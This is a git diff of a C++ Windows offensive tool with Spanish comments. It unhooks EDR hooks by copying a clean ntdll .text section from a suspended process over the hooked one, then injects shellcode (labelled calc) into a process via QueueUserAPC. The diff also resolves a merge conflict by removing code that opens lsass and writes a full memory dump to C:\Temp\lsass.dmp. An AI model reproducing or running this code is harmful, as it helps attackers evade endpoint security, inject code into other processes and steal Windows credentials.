@@ -1,3 +1,4 @@
+
 #define _CRT_SECURE_NO_WARNINGS
 
 #include <windows.h>
@@ -21,7 +22,7 @@ int filter(unsigned int code)
 	return EXCEPTION_EXECUTE_HANDLER;
 }
 
-BOOL unhook(wchar_t* processName);
+BOOL unhook(wchar_t * processName);
 
 
 void inject()
@@ -51,7 +52,7 @@ void inject()
 		"\xf6\x32\xcc\xe6\x6e\xdc\x18\xa5\x4b\x09\xd5\x14\xfa\x56\x6d"
 		"\xf9\xb1\xc7\x1c\x99\x40\x5f\x0c\xcc\x93\x60\xa3\x1e\xf0\x3c"
 		"\x6d\xa0\xf0\x4e";
-	; /*x64 Calc.exe Shellcode*/
+	/*calc Shellcode*/
 
 
 		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
@@ -96,51 +97,25 @@ int wmain(int argc, wchar_t** argv)
 	/*Usage: unhook.exe <path_of_exe_to_create_suspended> */
 	if (argc < 2)
 	{
-<<<<<<< HEAD
 		printf("Usage: %S <path_of_exe_to_create_suspended>", argv[0]);
-=======
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 		return -1;
 	}
 	else
 	{
-<<<<<<< HEAD
 		if (!unhook(argv[1])) /*If unhook not succedded*/
 			return 0;
 	}
 
 	inject(); /*Injector QueueUserAPC Poc Thanks Ired.team!!*/
 	
-=======
-		if (wcstoul(argv[1], NULL, 10) != 0) //Si el parametro primero es un numero intentamos dumpear directamente
-			goto dumpea;
-		if (!unhook(argv[1])) //Si no es un numero pues deshookeamos y luego dumpeamos
-			return 0;
-	}
-
-dumpea:
-	if (argc == 3)
-		pId = wcstoul(argv[2], NULL, 10);
-	else
-	{
-		printf("No teastemos lsass\n");
-		return 0;
-	}
-	printf("Testeando lsass\n");
-	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pId);
-	HANDLE outFile = CreateFile(L"C:\\Temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	BOOL isDumped = MiniDumpWriteDump(lsassHandle, pId, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-	if (isDumped)
-		printf("Dumped yeah\n");
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 	return 1;
-
+	
 
 }
+	
 
 
-
-BOOL unhook(wchar_t* processName)
+BOOL unhook(wchar_t *processName)
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -234,13 +209,8 @@ BOOL unhook(wchar_t* processName)
 					{
 
 						/*
-<<<<<<< HEAD
 						Si es el primer match es el propip PE del ejecutable, solo me guardo la direccion
 						para saltar al final de esa direccion y ahorrarme leerlo entero
-=======
-						Si es el primer match es el propip PE del ejecutable, solo me guardo la direcciï¿½n
-						para saltar al final de esa direcciï¿½n y ahorrarme leerlo entero
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 						*/
 						if (contador == 1)
 						{
@@ -256,11 +226,7 @@ BOOL unhook(wchar_t* processName)
 							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
 							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
 							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
-<<<<<<< HEAD
 							/*Ahi ese donde saco el tamano del PE32 para luego saltarmelo*/
-=======
-							/*Ahi ese donde saco el tamaï¿½o del PE32 para luego saltarmelo*/
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 							addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
 							contador += 1;
 							goto continuar;
@@ -294,29 +260,17 @@ BOOL unhook(wchar_t* processName)
 								//Si es la seccion text estamos de suerte
 								if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
 								{
-<<<<<<< HEAD
 									//Guardamos el tamano de la seccion text
-=======
-									//Guardamos el tamaï¿½o de la seccion text
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 									unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
 									//Guardamos el addr de la seccion text (coincide con el addr de mi propia seccion text de mi dll, gracias microsoft!!
 									unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
 									addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
-<<<<<<< HEAD
 									//Comprobamos el tamano de memoria que podemos leer de ahi, para que no de por saco
-=======
-									//Comprobamos el tamaï¿½o de memoria que podemos leer de ahï¿½, para que no de por saco
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 									VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
 									delete[] buffer;
 
 #ifdef _M_X64 
-<<<<<<< HEAD
 									/*Ese numero es por tema de padding, sino anade byte nulls al final que no hacen falta*/
-=======
-
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 									buffer = new char[basic.RegionSize - 2000];
 									/*Leemos la seccion text de la dll del proceso suspendido*/
 									bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
@@ -329,21 +283,13 @@ BOOL unhook(wchar_t* processName)
 									/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
 									fwrite(buffer, bytesRead, 1, fp);
 									fclose(fp);*/
-<<<<<<< HEAD
 
-=======
-							
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 									DWORD oldProtection, oldProtection2 = 0;
 									/*
 									Cambiamos el protect de esa zona para darnos permisos de escritura, y luego
 									finalmente escribimos la DLL que habiamos leido antes en el proceso suspendido en
 									mi DLL hookeada por el EDR*/
-<<<<<<< HEAD
 									
-=======
-
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
 									bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 									/*¡¡Thanks to ired.team i didn´t lost my mind trying to calculate that address!!*/
@@ -394,16 +340,10 @@ BOOL unhook(wchar_t* processName)
 
 		}
 	}
-	__except (filter(GetExceptionCode())) /*Evitamos posibles overflows XD*/
+	__except (filter(GetExceptionCode()))
 	{
-		std::cout << "Error convirtiendo datos\n";
 		return 0;
 	}
 
 
-<<<<<<< HEAD
 }
-=======
-}
-
->>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
